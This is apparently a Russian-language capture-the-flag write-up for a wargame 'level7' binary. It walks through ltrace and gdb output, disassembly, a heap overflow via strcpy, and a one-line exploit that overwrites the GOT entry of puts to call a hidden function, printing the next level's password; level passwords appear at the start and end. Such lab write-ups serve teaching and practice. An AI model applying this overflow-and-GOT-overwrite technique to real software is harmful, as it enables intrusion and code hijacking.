# su level7
# pass: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

====
Уязвимость: отключена рандомизация памяти, последовательное выделение памяти (маллок), перезатереть указатель через переполнение strcpy, а потом указатель на GOT
====

**Поведение: без аргументов сегается, с двумя вывод ~~**

# ./level7
Segmentation fault (core dumped)

# ltrace ./level7 
__libc_start_main(0x8048521, 1, 0xbffff804, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                 = 0x0804a008
malloc(8)                                                                                 = 0x0804a018
malloc(8)                                                                                 = 0x0804a028
malloc(8)                                                                                 = 0x0804a038
strcpy(0x0804a018, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

# ./level7 1 2
~~

# ltrace ./level7 1 2 3
__libc_start_main(0x8048521, 4, 0xbffff7e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                 = 0x0804a008
malloc(8)                                                                                 = 0x0804a018
malloc(8)                                                                                 = 0x0804a028
malloc(8)                                                                                 = 0x0804a038
strcpy(0x0804a018, "1")                                                                   = 0x0804a018
strcpy(0x0804a038, "2")                                                                   = 0x0804a038
fopen("/home/user/level8/.pass", "r")                                                     = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

Проверяем функции, переменные:

# i func
<>
0x080484f4  m
0x08048521  main
<>

# i var
<>
0x08049960  c

# x/a 0x08049960
0x8049960 <c>:  0x0

# disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   %ebp
   0x08048522 <+1>:     mov    %esp,%ebp
   0x08048524 <+3>:     and    $0xfffffff0,%esp
   0x08048527 <+6>:     sub    $0x20,%esp
   0x0804852a <+9>:     movl   $0x8,(%esp)
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
   0x0804853a <+25>:    mov    0x1c(%esp),%eax
   0x0804853e <+29>:    movl   $0x1,(%eax)
   0x08048544 <+35>:    movl   $0x8,(%esp)
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    %eax,%edx
   0x08048552 <+49>:    mov    0x1c(%esp),%eax
   0x08048556 <+53>:    mov    %edx,0x4(%eax)
   0x08048559 <+56>:    movl   $0x8,(%esp)
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    %eax,0x18(%esp)
   0x08048569 <+72>:    mov    0x18(%esp),%eax
   0x0804856d <+76>:    movl   $0x2,(%eax)
   0x08048573 <+82>:    movl   $0x8,(%esp)
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    %eax,%edx
   0x08048581 <+96>:    mov    0x18(%esp),%eax
   0x08048585 <+100>:   mov    %edx,0x4(%eax)
   0x08048588 <+103>:   mov    0xc(%ebp),%eax
   0x0804858b <+106>:   add    $0x4,%eax
   0x0804858e <+109>:   mov    (%eax),%eax
   0x08048590 <+111>:   mov    %eax,%edx
   0x08048592 <+113>:   mov    0x1c(%esp),%eax
   0x08048596 <+117>:   mov    0x4(%eax),%eax
   0x08048599 <+120>:   mov    %edx,0x4(%esp)
   0x0804859d <+124>:   mov    %eax,(%esp)
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    0xc(%ebp),%eax
   0x080485a8 <+135>:   add    $0x8,%eax
   0x080485ab <+138>:   mov    (%eax),%eax
   0x080485ad <+140>:   mov    %eax,%edx
   0x080485af <+142>:   mov    0x18(%esp),%eax
   0x080485b3 <+146>:   mov    0x4(%eax),%eax
   0x080485b6 <+149>:   mov    %edx,0x4(%esp)
   0x080485ba <+153>:   mov    %eax,(%esp)
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    $0x80486e9,%edx               "r"
   0x080485c7 <+166>:   mov    $0x80486eb,%eax               "/home/user/level8/.pass"
   0x080485cc <+171>:   mov    %edx,0x4(%esp)
   0x080485d0 <+175>:   mov    %eax,(%esp)
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
   0x080485dc <+187>:   movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:   movl   $0x8049960,(%esp)            0x8049960 <c>:   ""
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)            "~~"
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    $0x0,%eax
   0x08048601 <+224>:   leave  
   0x08048602 <+225>:   ret    
End of assembler dump.

# disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx              "%s - %d\n"
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)         0x8049960 <c>:   ""
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave  
   0x08048520 <+44>:    ret    
End of assembler dump.

Также маллоки располагаются последовательно, но есть отличия. 
Есть незащищенный strcpy, а флаг сохраняется в глобальной переменной.
Вызывая strcpy в первый раз (1 аргумент) перезапишем адрес, который будет использоваться вторым strcpy, который уже положит в GOT функцию m вместо puts
{указатель1}->{значение1}{указатель2}->{значение2}
То есть сначала мы делаем так, чтобы указатель был направлен на таблицу, а потом записываем в таблицу значение (разыменовываем адрес, который записан 1 strcpy).

Найти оффсет:
# r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A'
0x37614136 7aA6
Равен 20

# disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.

# ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9